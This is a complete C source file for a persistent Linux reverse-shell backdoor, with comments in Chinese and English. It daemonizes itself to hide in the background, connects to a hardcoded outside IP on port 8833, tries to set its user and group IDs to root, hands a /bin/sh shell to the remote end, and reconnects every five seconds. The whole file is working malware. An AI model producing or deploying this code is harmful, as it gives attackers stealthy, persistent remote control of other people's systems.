#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/wait.h>

int main(int argc, char *argv[]) {
    struct sockaddr_in addr;
    int s;
    char *ip = "8.148.71.198"; // 记得修改为你的监听 IP
    short port = 8833;
    pid_t pid;

    // 类似于 WinMain 的隐蔽性，daemon() 可以让程序在后台作为守护进程运行
    // 第一个参数 1 表示不改变工作目录，第二个参数 0 表示重定向标准输入输出到 /dev/null
    // Equivalent to avoiding the console window in Windows
     daemon(1, 0); 

    while (1) {
        // 创建套接字
        // Create a socket
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            sleep(5);
            continue;
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(ip);

        // 尝试连接
        // Attempt to connect
        if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            
            // 连接成功，创建子进程来运行 Shell
            // Connection successful, fork a child process
            pid = fork();

            if (pid == 0) {
                // --- 子进程 (Child Process) ---
                // 关键点：显式设置 UID/GID 为 0 (Root)
                // 只有当文件具有 SUID root 权限时，这两行才会生效
                setuid(0); 
                setgid(0);
                // 使用 dup2 将标准输入(0)、标准输出(1)、标准错误(2) 重定向到套接字 s
                // Redirect stdin, stdout, and stderr to the socket
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                // 启动 shell (相当于 cmd.exe)
                // Launch /bin/sh (equivalent to cmd.exe)
                execl("/bin/sh", "sh", NULL);
                
                // 如果 execl 失败，退出子进程
                exit(0); 
            } else if (pid > 0) {
                // --- 父进程 (Parent Process) ---
                
                // 等待子进程结束（例如远程执行了 exit）
                // Wait for the child process to exit
                waitpid(pid, NULL, 0);
            }
        }

        // 关闭套接字并准备重试
        // Close socket and retry
        close(s);

        // 关键：延迟重连（5秒）
        // Sleep for 5s before reconnecting
        sleep(5);
    }

    return 0;

}
